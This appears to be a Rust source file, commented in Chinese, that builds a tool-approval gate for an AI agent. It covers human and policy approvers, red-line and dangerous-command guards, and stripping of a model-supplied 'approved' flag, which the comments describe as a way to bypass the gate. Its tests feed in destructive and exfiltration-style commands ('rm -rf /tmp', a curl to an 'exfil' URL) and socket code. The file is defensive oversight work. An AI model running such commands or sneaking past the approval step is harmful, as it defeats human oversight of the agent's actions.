// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 EvoRule Project
// This file is part of EvoRule, licensed under GNU Affero General Public License v3 or later.
//! G8:工具审批机制 — candidate 类工具的"用户批准 → 执行"闭环
//!
//! ## 设计
//!
//! 当 `shell_exec` / `http_get` 等工具的 candidate 分支返回
//! `{"status":"needs_approval",...}` 时,runner 拦截并通过 `ApprovalCallback`
//! 问用户是否批准。用户批准后,runner 带 `approved:true` 重新调用工具。
//!
//! ## 实现
//!
//! - [`CliApproval`]:CLI 模式,从 stdin 读 y/n(manual 态)
//! - [`HttpApproval`]:HTTP/SSE 模式,通过 oneshot channel 等 POST `/approve`(manual 态)
//! - [`PolicyApproval`]:auto_policy 态,判定式决策端(无人值守,理由必产+留痕)
//! - [`AutoApprove`]:测试用,总是返回 true

use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use async_trait::async_trait;
use tokio::sync::oneshot;
use tracing::{info, warn};

/// 工具返回的审批请求(从 proposal JSON 解析)
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct ApprovalRequest {
    /// 会话 ID(HTTP 模式下用于关联审批请求和 /approve 端点)
    pub session_id: String,
    /// 工具名称
    pub tool_name: String,
    /// 工具参数
    pub args: serde_json::Value,
    /// 命令描述(如 `rm -rf /tmp/test`)
    pub command: String,
    /// 风险说明
    pub risk: String,
    /// 替代方案建议
    pub alternative: String,
    /// 提案 ID(审批链留痕主键,由 parse 时自动生成)
    pub proposal_id: String,
    /// 宿主任意代码执行上下文(提案侧携带:python_exec 未装配 workspace
    /// 沙箱为 true,其余 false)——决策端红线原语按执行面判定
    /// `red_line.host_code_execution`,静态逃逸检测绕过形态由本面兜底
    pub host_execution: bool,
}

/// 生成新的提案 ID(`ap-` 前缀 + 纳秒时间戳十六进制,如 `ap-18f3a2...`)
///
/// 用系统时间戳而非随机 UUID,避免引入新依赖;纳秒精度足以区分
/// 同进程内的连续提案。
pub fn new_proposal_id() -> String {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    format!("ap-{:x}", nanos)
}

/// 审批决定 — 带决策者身份与验证状态(审计链留痕用)
///
/// - `approver`:验证后的用户名,或 `"unverified"` / `"cli-user"` / `"auto"`
/// - `verified`:身份是否经平台认证端验证(`true` 仅当 approver_token 验证成功)
/// - `auto_rejected`:是否为系统自动拒绝(超时 / 通道关闭),仅此场景为 `true`
#[derive(Debug, Clone, serde::Serialize)]
pub struct ApprovalDecision {
    /// 是否批准执行
    pub approved: bool,
    /// 决策者标识(用户名 / unverified / cli-user / auto)
    pub approver: String,
    /// 身份是否经平台认证验证
    pub verified: bool,
    /// 决策理由(拒绝原因 / 验证失败原因)
    pub reason: String,
    /// 是否系统自动拒绝(超时 / 通道关闭)
    pub auto_rejected: bool,
    /// policy 评审判定全文 JSON(封存面:runner 落账 journal 供跨重启回放;
    /// None=非评审路径。tool_trace 序列化时省略,审计链形状零变化)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub verdict_json: Option<String>,
}

/// HTTP 审批等待项 — pending map 的值类型
///
/// `proposal_id` 用于 `/approve` 端点校验回传 ID 与等待中的提案一致,
/// 防止串话(旧提案的迟到审批打到新提案上)。
#[derive(Debug)]
pub struct PendingApproval {
    /// 审批结果回传通道
    pub tx: oneshot::Sender<ApprovalDecision>,
    /// 等待中的提案 ID
    pub proposal_id: String,
    /// 等待中的提案原文快照(/approve 端点消费:自动决策守卫按工具/命令
    /// 复核危险守卫表,防止客户端会话记忆旁路 T2 恒压;人工决策不受限)
    pub request: ApprovalRequest,
}

/// 审批回调 trait — 不同运行模式不同实现
///
/// runner 在 `maybe_handle_approval` 中调用 `request_approval()`,
/// 该方法阻塞直到用户做出决定(或超时)。
#[async_trait]
#[allow(clippy::double_must_use)] // async_trait 宏生成的 must_use 与 Boxed Future 类型语义重复,源上无法消
pub trait ApprovalCallback: Send + Sync {
    /// 问用户是否批准。返回 [`ApprovalDecision`](带决策者身份),决定执行与否
    async fn request_approval(&self, req: &ApprovalRequest) -> ApprovalDecision;
}

/// CLI 模式:从 stdin 读取 y/n
pub struct CliApproval {
    /// `--auto-approve-candidates` 时为 true,跳过交互直接批准
    pub auto_approve: bool,
    /// 无人值守审批等待上限(秒,可选):Some(n)=等待 n 秒未决自动拒绝
    /// (deny 默认向,绝不自动批准,决策 approver=auto+auto_rejected 标记
    /// +reason 落账,镜像 [`HttpApproval`] 超时裁决形态);None(缺省)=交互
    /// 现行为(stdin 无限等待,既有调用零变化)
    pub timeout_secs: Option<u64>,
}

/// CLI 审批输入结果透传(交互现行为形态)
fn cli_user_decision(approved: bool) -> ApprovalDecision {
    ApprovalDecision {
        approved,
        approver: "cli-user".to_string(),
        verified: false,
        reason: String::new(),
        auto_rejected: false,
        verdict_json: None,
    }
}

/// CLI 审批等待裁决:输入结果透传;声明等待上限的无人值守窗口,等待超限
/// 未决 → 自动拒绝(deny 默认向,绝不 auto-approve)+告警决策留痕
async fn resolve_cli_approval(
    wait: impl std::future::Future<Output = bool>,
    timeout: Option<Duration>,
    tool_name: &str,
) -> ApprovalDecision {
    match timeout {
        Some(d) => match tokio::time::timeout(d, wait).await {
            Ok(approved) => cli_user_decision(approved),
            Err(_) => {
                warn!(
                    tool = %tool_name,
                    timeout_secs = d.as_secs(),
                    "approval wait timeout: auto-denied (deny-default), unattended window"
                );
                ApprovalDecision {
                    approved: false,
                    approver: "auto".to_string(),
                    verified: false,
                    reason: format!(
                        "timeout: approval wait exceeded {}s, auto-denied (deny-default direction, unattended window)",
                        d.as_secs()
                    ),
                    auto_rejected: true,
                    verdict_json: None,
                }
            }
        },
        None => cli_user_decision(wait.await),
    }
}

#[async_trait]
impl ApprovalCallback for CliApproval {
    async fn request_approval(&self, req: &ApprovalRequest) -> ApprovalDecision {
        if self.auto_approve {
            warn!(tool = %req.tool_name, command = %req.command, "auto-approved candidate tool");
            return ApprovalDecision {
                approved: true,
                approver: "cli-user".to_string(),
                verified: false,
                reason: String::new(),
                auto_rejected: false,
                verdict_json: None,
            };
        }

        // 用 spawn_blocking 避免 stdin 读取阻塞 tokio runtime
        let command = req.command.clone();
        let risk = req.risk.clone();
        let alternative = req.alternative.clone();
        let tool_name = req.tool_name.clone();
        let timeout_secs = self.timeout_secs;

        let wait = async move {
            tokio::task::spawn_blocking(move || {
                eprintln!("\n⚠️  Tool approval required:");
                eprintln!("  tool: {}", tool_name);
                eprintln!("  command: {}", command);
                eprintln!("  risk: {}", risk);
                if !alternative.is_empty() {
                    eprintln!("  alternative: {}", alternative);
                }
                eprint!("Approve? [y/N] ");
                use std::io::Write;
                let _ = std::io::stdout().flush();
                let mut input = String::new();
                let _ = std::io::stdin().read_line(&mut input);
                input.trim().eq_ignore_ascii_case("y")
            })
            .await
            .unwrap_or(false)
        };

        resolve_cli_approval(wait, timeout_secs.map(Duration::from_secs), &req.tool_name).await
    }
}

/// G8:HTTP 审批等待超时(秒)
pub const HTTP_APPROVAL_TIMEOUT_SECS: u64 = 60;

/// HTTP/SSE 模式:通过 oneshot channel 等 POST `/approve`
///
/// - `request_approval()` 创建 oneshot channel,把 sender 存入 `pending` map
/// - HTTP 端点 `POST /agents/{t}/approve` 从 `pending` 取出 sender 并发送审批决定
/// - 超时(`HTTP_APPROVAL_TIMEOUT_SECS` 秒)后自动拒绝
pub struct HttpApproval {
    /// session_id → 审批等待项(sender + proposal_id)
    pub pending: Arc<Mutex<HashMap<String, PendingApproval>>>,
    /// 超时秒数(默认 60)
    pub timeout_secs: u64,
}

impl HttpApproval {
    /// 创建 HttpApproval,共享 `pending` map
    pub fn new(pending: Arc<Mutex<HashMap<String, PendingApproval>>>) -> Self {
        Self {
            pending,
            timeout_secs: HTTP_APPROVAL_TIMEOUT_SECS,
        }
    }

    /// 创建 HttpApproval,独立 pending map(测试用)
    pub fn new_standalone() -> Self {
        Self::new(Arc::new(Mutex::new(HashMap::new())))
    }
}

#[async_trait]
impl ApprovalCallback for HttpApproval {
    async fn request_approval(&self, req: &ApprovalRequest) -> ApprovalDecision {
        let (tx, rx) = oneshot::channel();
        {
            let mut pending = self
                .pending
                .lock()
                .expect("pending_approvals mutex poisoned");
            pending.insert(
                req.session_id.clone(),
                PendingApproval {
                    tx,
                    proposal_id: req.proposal_id.clone(),
                    request: req.clone(),
                },
            );
        }

        info!(
            session = %req.session_id,
            tool = %req.tool_name,
            command = %req.command,
            "G8: awaiting HTTP approval (timeout {}s)",
            self.timeout_secs
        );

        match tokio::time::timeout(Duration::from_secs(self.timeout_secs), rx).await {
            Ok(Ok(decision)) => decision,
            Ok(Err(_)) => {
                // sender 被 drop(不应该发生,但防御性处理)
                warn!(session = %req.session_id, "approval channel closed unexpectedly");
                ApprovalDecision {
                    approved: false,
                    approver: "auto".to_string(),
                    verified: true,
                    reason: "approval channel closed".to_string(),
                    auto_rejected: true,
                    verdict_json: None,
                }
            }
            Err(_) => {
                // 超时:自动拒绝 + 清理
                warn!(
                    session = %req.session_id,
                    timeout_secs = self.timeout_secs,
                    "G8: approval timed out, auto-denying"
                );
                let mut pending = self
                    .pending
                    .lock()
                    .expect("pending_approvals mutex poisoned");
                pending.remove(&req.session_id);
                ApprovalDecision {
                    approved: false,
                    approver: "auto".to_string(),
                    verified: true,
                    reason: "timeout".to_string(),
                    auto_rejected: true,
                    verdict_json: None,
                }
            }
        }
    }
}

/// Mock:总是批准(测试用)
pub struct AutoApprove;

#[async_trait]
impl ApprovalCallback for AutoApprove {
    async fn request_approval(&self, req: &ApprovalRequest) -> ApprovalDecision {
        info!(tool = %req.tool_name, "AutoApprove: auto-approved");
        ApprovalDecision {
            approved: true,
            approver: "auto".to_string(),
            verified: true,
            reason: String::new(),
            auto_rejected: false,
            verdict_json: None,
        }
    }
}

/// Mock:总是拒绝(测试用)
pub struct DenyAll;

#[async_trait]
impl ApprovalCallback for DenyAll {
    async fn request_approval(&self, req: &ApprovalRequest) -> ApprovalDecision {
        info!(tool = %req.tool_name, "DenyAll: auto-denied");
        ApprovalDecision {
            approved: false,
            approver: "auto".to_string(),
            verified: true,
            reason: "denied by policy".to_string(),
            auto_rejected: false,
            verdict_json: None,
        }
    }
}

/// auto_policy 态:判定式决策端(人工审查开合,2026-09-28 立项)
///
/// 「全自主」语义 = 运行期零人工决策事件,但每个原需人工决策的点均有
/// 程序判定+理由留痕:工具侧 candidate 分支照常评估 risk 产出 proposal
/// (判断逻辑零改动,#13 红线),本决策端对 proposal 执行判定评估——
/// 判断结果降级为留痕(reason 必产),不阻塞执行。
///
/// 与 [`AutoApprove`](测试用)的本质区别:判定理由必产 + approver 语义
/// 精确("auto_policy"),决策事件随 tool_trace approval 子对象入审计链。
pub struct PolicyApproval;

#[async_trait]
impl ApprovalCallback for PolicyApproval {
    async fn request_approval(&self, req: &ApprovalRequest) -> ApprovalDecision {
        let reason = format!("auto_policy: risk={} accepted in unattended mode", req.risk);
        info!(
            tool = %req.tool_name,
            command = %req.command,
            proposal_id = %req.proposal_id,
            "auto_policy: candidate approved by policy (unattended mode)"
        );
        ApprovalDecision {
            approved: true,
            approver: "auto_policy".to_string(),
            verified: false,
            reason,
            auto_rejected: false,
            verdict_json: None,
        }
    }
}

/// 红线豁免前置闸(豁免清单适用于所有审批档位)
///
/// 判定式决策端(`[`PolicyApproval`]`,无人值守)在命中红线豁免清单时,
/// 缺省**不得**由策略自批准——回落人工决策端(serve=审批卡 60s 窗,
/// CLI=stdin 交互 / 无人值守面=显式拒绝);用户以
/// `approval.exemptionOverride=true` 显式关闭豁免时按原判定放行,
/// 决策理由必带 `exemption_overridden` 标记(审计强化)。
///
/// 红线判定复用 [`crate::agent::approval_policy::hits_red_line`] 纯函数,
/// 与 policy 评审档的前置闸同源同口径(serve/CLI 各执行面不分叉)。
pub struct RedLineGuardApproval {
    /// 常规判定端(auto_policy 判定式)
    inner: Arc<dyn ApprovalCallback>,
    /// 红线命中时的回落决策端(人工卡 / stdin / DenyAll——按执行面装配)
    manual: Arc<dyn ApprovalCallback>,
    /// 用户显式关闭红线强制
    exemption_override: bool,
}

impl RedLineGuardApproval {
    /// 构造(inner=常规判定端;manual=红线命中回落决策端;
    /// exemption_override=用户显式关闭红线强制——放行留痕必带标记)
    pub fn new(
        inner: Arc<dyn ApprovalCallback>,
        manual: Arc<dyn ApprovalCallback>,
        exemption_override: bool,
    ) -> Self {
        Self {
            inner,
            manual,
            exemption_override,
        }
    }
}

#[async_trait]
impl ApprovalCallback for RedLineGuardApproval {
    async fn request_approval(&self, req: &ApprovalRequest) -> ApprovalDecision {
        let red_line = crate::agent::approval_policy::hits_red_line_for_request(req);
        if let Some(red) = red_line {
            if !self.exemption_override {
                info!(
                    tool = %req.tool_name,
                    marker = red.as_str(),
                    "red line hit: forced manual approval (exemption applies to all modes)"
                );
                let mut d = self.manual.request_approval(req).await;
                d.reason = format!("[{}] {}", red.as_str(), d.reason);
                return d;
            }
            let mut d = self.inner.request_approval(req).await;
            d.reason = format!("{} [exemption_overridden:{}]", d.reason, red.as_str());
            return d;
        }
        self.inner.request_approval(req).await
    }
}

/// 自动决策守卫前置闸(危险操作永不自动批准——判定端侧守卫,与 /approve
/// decision_scope 端点守卫同族双端)
///
/// 判定式决策端([`PolicyApproval`],无人值守)对守卫面命中的提案不自动批准,
/// 回落人工决策端(REPL=stdin 交互确认 / serve=审批卡 60s 窗超时自动拒 /
/// CLI 无人值守=stdin EOF 拒绝),命中告警 warn! 留痕。守卫面窄覆盖,与服务端
/// 守卫同表同口径:
/// - `python_exec`:代码命中逃逸意图静态检测(写面/网络/进程外,
///   [`crate::agent::approval_tier::hits_escape_intent`])
/// - `shell_exec`:命令命中危险子命令守卫表(空命令从严,
///   [`crate::agent::approval_tier::hits_auto_deny_guard`])
/// - 其余工具不在此守卫面:file 族等写面候选工具的提案无 command 字段
///   (解析后为空串,守卫表按命中处理),按工具名窄覆盖才不误伤 auto 档
///   文件操作;其自动语义由 T0/T1 写面判据承担
pub struct AutoDecisionGuardApproval {
    /// 常规判定端(auto_policy 判定式)
    inner: Arc<dyn ApprovalCallback>,
    /// 守卫命中时的回落决策端(stdin 交互 / 审批卡 / DenyAll——按执行面装配)
    manual: Arc<dyn ApprovalCallback>,
}

impl AutoDecisionGuardApproval {
    /// 构造(inner=常规判定端;manual=守卫命中回落决策端)
    pub fn new(inner: Arc<dyn ApprovalCallback>, manual: Arc<dyn ApprovalCallback>) -> Self {
        Self { inner, manual }
    }
}

#[async_trait]
impl ApprovalCallback for AutoDecisionGuardApproval {
    async fn request_approval(&self, req: &ApprovalRequest) -> ApprovalDecision {
        let guarded = match req.tool_name.as_str() {
            "python_exec" => {
                let code = req.args.get("code").and_then(|v| v.as_str()).unwrap_or("");
                crate::agent::approval_tier::hits_escape_intent(code)
            }
            "shell_exec" => crate::agent::approval_tier::hits_auto_deny_guard(&req.command),
            _ => false,
        };
        if guarded {
            warn!(
                tool = %req.tool_name,
                command = %req.command,
                "auto decision guard hit: dangerous proposal never auto-approved, downgraded to manual approval"
            );
            let mut d = self.manual.request_approval(req).await;
            d.reason = format!("[auto_decision_guard] {}", d.reason);
            return d;
        }
        self.inner.request_approval(req).await
    }
}

/// G8(人工审查开合):剥离工具调用参数中 LLM 自带的 `approved` 旗标
///
/// candidate 工具两次调用协议中,`approved:true` 只能由 runner 在决策端批准后的
/// 重执行时注入([`crate::agent::runner`] 的 `maybe_handle_approval`/`resolve_approval`)。
/// 若放行 LLM 首调自带该旗标,工具会跳过 proposal 直接执行——决策门被参数旁路
/// (无决策事件、无审计留痕,manual/auto_policy 两态同洞)。首调前强制剥离,
/// 保证每个 candidate 操作必然经过决策端(manual=人工窗 / auto_policy=判定式)
/// 并留痕。非 object 参数原样返回。
pub fn strip_approved_flag(args: &serde_json::Value) -> serde_json::Value {
    match args {
        serde_json::Value::Object(map) => {
            let mut cleaned = map.clone();
            cleaned.remove("approved");
            serde_json::Value::Object(cleaned)
        }
        other => other.clone(),
    }
}

/// G8:从工具返回的 JSON 中解析审批请求
///
/// 如果工具返回 `{"status":"needs_approval",...}`,则解析出 `ApprovalRequest`。
/// 否则返回 `None`(不是审批请求)。
///
/// 这是 runner 的 `maybe_handle_approval` 和流式路径共用的解析逻辑。
pub fn parse_approval_request(
    session_id: &str,
    tool_name: &str,
    args: &serde_json::Value,
    tool_result_str: &str,
) -> Option<ApprovalRequest> {
    let result_json: serde_json::Value = serde_json::from_str(tool_result_str).ok()?;

    if result_json.get("status").and_then(|v| v.as_str()) != Some("needs_approval") {
        return None;
    }

    Some(ApprovalRequest {
        session_id: session_id.to_string(),
        tool_name: tool_name.to_string(),
        args: args.clone(),
        command: result_json
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        risk: result_json
            .get("risk")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown")
            .to_string(),
        alternative: result_json
            .get("alternative")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        // 提案 ID 单源:管道⑤评估臂已生成并注入 proposal JSON 时直接沿用
        // (账面/留痕/决策端三方一致);兼容形态(工具自管协议遗留)无该字段
        // 则在此生成,后续审批留痕与 /approve 校验共用
        proposal_id: result_json
            .get("proposal_id")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
            .unwrap_or_else(new_proposal_id),
        // 宿主任意代码执行上下文:提案侧机器可读标记(python_exec 未装配
        // workspace 沙箱为 true),决策端红线按执行面判定;缺省 false(兼容
        // 遗留提案形态零变化)
        host_execution: result_json
            .get("host_execution")
            .and_then(|v| v.as_bool())
            .unwrap_or(false),
    })
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used)]
    use super::*;
    use serde_json::json;

    // ===== parse_approval_request 测试 =====

    #[test]
    fn test_parse_approval_request_needs_approval() {
        let result = r#"{"status":"needs_approval","command":"rm -rf /tmp","risk":"high","alternative":"use trash instead"}"#;
        let req = parse_approval_request(
            "s1",
            "shell_exec",
            &json!({"command": "rm -rf /tmp"}),
            result,
        );
        assert!(req.is_some());
        let req = req.unwrap();
        assert_eq!(req.session_id, "s1");
        assert_eq!(req.tool_name, "shell_exec");
        assert_eq!(req.command, "rm -rf /tmp");
        assert_eq!(req.risk, "high");
        assert_eq!(req.alternative, "use trash instead");
    }

    #[test]
    fn test_parse_approval_request_not_a_proposal() {
        let result = r#"{"status":"ok","output":"done"}"#;
        let req = parse_approval_request("s1", "shell_exec", &json!({}), result);
        assert!(req.is_none());
    }

    #[test]
    fn test_parse_approval_request_invalid_json() {
        let req = parse_approval_request("s1", "shell_exec", &json!({}), "not json");
        assert!(req.is_none());
    }

    #[test]
    fn test_parse_approval_request_missing_fields_uses_defaults() {
        // 只有 status 字段,其他缺失 → 用默认值
        let result = r#"{"status":"needs_approval"}"#;
        let req = parse_approval_request("s1", "shell_exec", &json!({}), result);
        assert!(req.is_some());
        let req = req.unwrap();
        assert_eq!(req.command, "");
        assert_eq!(req.risk, "unknown"); // 默认值
        assert_eq!(req.alternative, "");
    }

    // ===== proposal_id 测试 =====

    #[test]
    fn test_new_proposal_id_format() {
        let id = new_proposal_id();
        // 格式:ap- 前缀 + 非空十六进制时间戳
        assert!(
            id.starts_with("ap-"),
            "proposal id should start with 'ap-': {}",
            id
        );
        let hex = &id["ap-".len()..];
        assert!(!hex.is_empty(), "proposal id should have timestamp suffix");
        assert!(
            hex.chars().all(|c| c.is_ascii_hexdigit()),
            "suffix should be hex, got: {}",
            hex
        );
    }

    #[test]
    fn test_new_proposal_id_unique_across_calls() {
        // 纳秒精度下连续调用应产生不同 ID
        let a = new_proposal_id();
        let b = new_proposal_id();
        assert_ne!(a, b);
    }

    #[test]
    fn test_parse_approval_request_fills_proposal_id() {
        let result = r#"{"status":"needs_approval","command":"ls /"}"#;
        let req = parse_approval_request("s1", "shell_exec", &json!({}), result).unwrap();
        assert!(req.proposal_id.starts_with("ap-"));
    }

    // ===== ApprovalDecision 构造断言(三实现) =====

    #[tokio::test]
    async fn test_auto_approve_decision_fields() {
        let cb = AutoApprove;
        let req = ApprovalRequest {
            session_id: "s1".to_string(),
            tool_name: "shell_exec".to_string(),
            args: json!({}),
            command: "rm -rf /tmp".to_string(),
            risk: "high".to_string(),
            alternative: "".to_string(),
            proposal_id: "ap-1".to_string(),
            host_execution: false,
        };
        let decision = cb.request_approval(&req).await;
        assert!(decision.approved);
        assert_eq!(decision.approver, "auto");
        assert!(decision.verified);
        assert!(!decision.auto_rejected);
    }

    #[tokio::test]
    async fn test_deny_all_decision_fields() {
        let cb = DenyAll;
        let req = ApprovalRequest {
            session_id: "s1".to_string(),
            tool_name: "shell_exec".to_string(),
            args: json!({}),
            command: "rm -rf /tmp".to_string(),
            risk: "high".to_string(),
            alternative: "".to_string(),
            proposal_id: "ap-1".to_string(),
            host_execution: false,
        };
        let decision = cb.request_approval(&req).await;
        assert!(!decision.approved);
        assert_eq!(decision.approver, "auto");
        assert!(decision.verified);
        assert_eq!(decision.reason, "denied by policy");
        assert!(!decision.auto_rejected);
    }

    #[tokio::test]
    async fn test_cli_approval_auto_approve_decision_fields() {
        let cb = CliApproval {
            auto_approve: true,
            timeout_secs: None,
        };
        let req = ApprovalRequest {
            session_id: "s1".to_string(),
            tool_name: "shell_exec".to_string(),
            args: json!({}),
            command: "ls /tmp".to_string(),
            risk: "medium".to_string(),
            alternative: "".to_string(),
            proposal_id: "ap-1".to_string(),
            host_execution: false,
        };
        let decision = cb.request_approval(&req).await;
        assert!(decision.approved);
        assert_eq!(decision.approver, "cli-user");
        assert!(!decision.verified);
        assert!(!decision.auto_rejected);
    }

    // ===== 无人值守审批等待看护(等待上限,超时自动拒绝 deny 默认向) =====

    #[tokio::test(start_paused = true)]
    async fn test_cli_approval_wait_timeout_auto_denies() {
        // 等待输入永不决(模拟无人值守窗口无人应答) → 超时自动拒绝
        let decision = resolve_cli_approval(
            std::future::pending::<bool>(),
            Some(Duration::from_secs(1)),
            "shell_exec",
        )
        .await;
        assert!(!decision.approved, "timeout must deny (deny-default)");
        assert_eq!(decision.approver, "auto");
        assert!(
            decision.auto_rejected,
            "timeout auto-rejection must be flagged"
        );
        assert!(
            decision.reason.contains("timeout"),
            "reason must be recorded for audit"
        );
    }

    #[tokio::test]
    async fn test_cli_approval_no_timeout_passthrough_preserves_behavior() {
        // None=交互现行为:输入结果透传,决策身份与标记零变化
        let approved = resolve_cli_approval(std::future::ready(true), None, "shell_exec").await;
        assert!(approved.approved);
        assert_eq!(approved.approver, "cli-user");
        assert!(!approved.auto_rejected);
        assert_eq!(approved.reason, "");

        let denied = resolve_cli_approval(std::future::ready(false), None, "shell_exec").await;
        assert!(!denied.approved);
        assert_eq!(denied.approver, "cli-user");
        // 用户显式拒绝 ≠ 超时自动裁决,auto_rejected 不打标
        assert!(!denied.auto_rejected);
    }

    #[tokio::test(start_paused = true)]
    async fn test_cli_approval_wait_timeout_wired_via_request_approval() {
        // 接线面守卫:声明等待上限的 CliApproval 走真实 request_approval 路径
        // 不再无限挂起(stdin 空读或超时两条路都收敛为拒绝)
        let cb = CliApproval {
            auto_approve: false,
            timeout_secs: Some(1),
        };
        let req = ApprovalRequest {
            session_id: "s1".to_string(),
            tool_name: "shell_exec".to_string(),
            args: json!({}),
            command: "rm -r calc-kit".to_string(),
            risk: "high".to_string(),
            alternative: "".to_string(),
            proposal_id: "ap-1".to_string(),
            host_execution: false,
        };
        let decision = cb.request_approval(&req).await;
        assert!(!decision.approved);
    }

    // ===== PolicyApproval 测试(人工审查开合) =====

    #[tokio::test]
    async fn test_policy_approval_decision_fields() {
        let cb = PolicyApproval;
        let req = ApprovalRequest {
            session_id: "s1".to_string(),
            tool_name: "shell_exec".to_string(),
            args: serde_json::json!({"command": "ls"}),
            command: "ls".to_string(),
            risk: "medium: executes a shell command".to_string(),
            alternative: String::new(),
            proposal_id: new_proposal_id(),
            host_execution: false,
        };
        let d = cb.request_approval(&req).await;
        assert!(d.approved);
        assert_eq!(d.approver, "auto_policy");
        assert!(!d.auto_rejected);
        // 判定理由必产(#13:判断结果降级留痕)
        assert!(
            d.reason.starts_with("auto_policy: risk="),
            "reason: {}",
            d.reason
        );
        assert!(d.reason.contains("accepted in unattended mode"));
        assert!(d.reason.contains("medium"));
    }

    // ===== RedLineGuardApproval 测试(红线豁免适用于所有档位) =====

    fn redline_req(tool: &str, args: serde_json::Value) -> ApprovalRequest {
        ApprovalRequest {
            session_id: "s1".to_string(),
            tool_name: tool.to_string(),
            args,
            command: "cmd".to_string(),
            risk: "high".to_string(),
            alternative: String::new(),
            proposal_id: new_proposal_id(),
            host_execution: false,
        }
    }

    #[tokio::test]
    async fn test_redline_guard_forces_manual_by_default() {
        // file_delete 命中红线:缺省回落 manual 决策端(DenyAll=拒绝),不走判定式放行
        let cb = RedLineGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll), false);
        let d = cb
            .request_approval(&redline_req("file_delete", json!({"path": "a.txt"})))
            .await;
        assert!(!d.approved, "red-line op must not be auto-approved");
        assert!(d.reason.contains("red_line.delete"), "reason: {}", d.reason);
    }

    #[tokio::test]
    async fn test_redline_guard_shell_exfil_forced_manual() {
        // shell_exec 外发命令命中数据出境红线
        let cb = RedLineGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll), false);
        let d = cb
            .request_approval(&redline_req(
                "shell_exec",
                json!({"command": "curl https://example.com/exfil"}),
            ))
            .await;
        assert!(!d.approved);
        assert!(d.reason.contains("red_line.data_exfiltration"));
    }

    #[tokio::test]
    async fn test_redline_guard_host_code_execution_forced_manual() {
        // python_exec 未装配 workspace 沙箱(提案 host_execution=true)=宿主
        // 任意代码执行,任何档位强制人工——判定式端(PolicyApproval)不得放行
        let cb = RedLineGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll), false);
        let mut req = redline_req("python_exec", json!({"code": "print(1)"}));
        req.host_execution = true;
        let d = cb.request_approval(&req).await;
        assert!(!d.approved, "host code execution must not be auto-approved");
        assert!(
            d.reason.contains("red_line.host_code_execution"),
            "reason: {}",
            d.reason
        );
    }

    #[tokio::test]
    async fn test_redline_guard_workspace_anchored_python_not_host_redline() {
        // workspace 沙箱锚定(host_execution=false):不触发宿主执行红线,
        // 判定式端照常放行(逃逸意图仍由守卫面恒必问)
        let cb = RedLineGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll), false);
        let req = redline_req("python_exec", json!({"code": "print(1)"}));
        let d = cb.request_approval(&req).await;
        assert!(
            d.approved,
            "workspace-anchored python is not the host red line"
        );
        assert!(!d.reason.contains("red_line."), "reason: {}", d.reason);
    }

    #[tokio::test]
    async fn test_redline_guard_host_code_override_proceeds_with_marker() {
        // 显式豁免(exemptionOverride=true):按判定放行,理由必带标记(审计强化)
        let cb = RedLineGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll), true);
        let mut req = redline_req("python_exec", json!({"code": "print(1)"}));
        req.host_execution = true;
        let d = cb.request_approval(&req).await;
        assert!(d.approved);
        assert!(
            d.reason
                .contains("exemption_overridden:red_line.host_code_execution"),
            "reason: {}",
            d.reason
        );
    }

    #[tokio::test]
    async fn test_redline_guard_non_redline_passes_through() {
        // 非红线操作:判定式原样放行,理由不带红线标记
        let cb = RedLineGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll), false);
        let d = cb
            .request_approval(&redline_req("shell_exec", json!({"command": "cargo test"})))
            .await;
        assert!(d.approved);
        assert_eq!(d.approver, "auto_policy");
        assert!(!d.reason.contains("red_line."));
    }

    #[tokio::test]
    async fn test_redline_guard_override_proceeds_with_marker() {
        // 用户显式关闭豁免:按判定式放行,理由必带 exemption_overridden 标记
        let cb = RedLineGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll), true);
        let d = cb
            .request_approval(&redline_req("file_delete", json!({"path": "a.txt"})))
            .await;
        assert!(d.approved);
        assert!(d.reason.contains("exemption_overridden:red_line.delete"));
    }

    // ===== AutoDecisionGuardApproval 测试(危险操作永不自动批准) =====

    fn guard_req(tool: &str, args: serde_json::Value, command: &str) -> ApprovalRequest {
        ApprovalRequest {
            session_id: "s1".to_string(),
            tool_name: tool.to_string(),
            args,
            command: command.to_string(),
            risk: "high".to_string(),
            alternative: String::new(),
            proposal_id: new_proposal_id(),
            host_execution: false,
        }
    }

    #[tokio::test]
    async fn test_auto_decision_guard_blocks_python_escape() {
        // python 代码命中逃逸意图(网络外发) → 回落人工决策端,不自动批
        let cb = AutoDecisionGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll));
        let d = cb
            .request_approval(&guard_req(
                "python_exec",
                json!({"code": "import socket\ns=socket.socket()"}),
                "",
            ))
            .await;
        assert!(!d.approved, "escape-intent code must not be auto-approved");
        assert!(
            d.reason.contains("auto_decision_guard"),
            "reason: {}",
            d.reason
        );
    }

    #[tokio::test]
    async fn test_auto_decision_guard_blocks_dangerous_shell() {
        // shell 危险子命令守卫表命中 → 回落人工
        let cb = AutoDecisionGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll));
        let d = cb
            .request_approval(&guard_req(
                "shell_exec",
                json!({"command": "rm -rf /tmp/x"}),
                "rm -rf /tmp/x",
            ))
            .await;
        assert!(
            !d.approved,
            "guarded shell command must not be auto-approved"
        );
    }

    #[tokio::test]
    async fn test_auto_decision_guard_blocks_empty_shell_command() {
        // 空 shell 命令从严按守卫处理(与守卫表同口径)
        let cb = AutoDecisionGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll));
        let d = cb
            .request_approval(&guard_req("shell_exec", json!({}), ""))
            .await;
        assert!(!d.approved);
    }

    #[tokio::test]
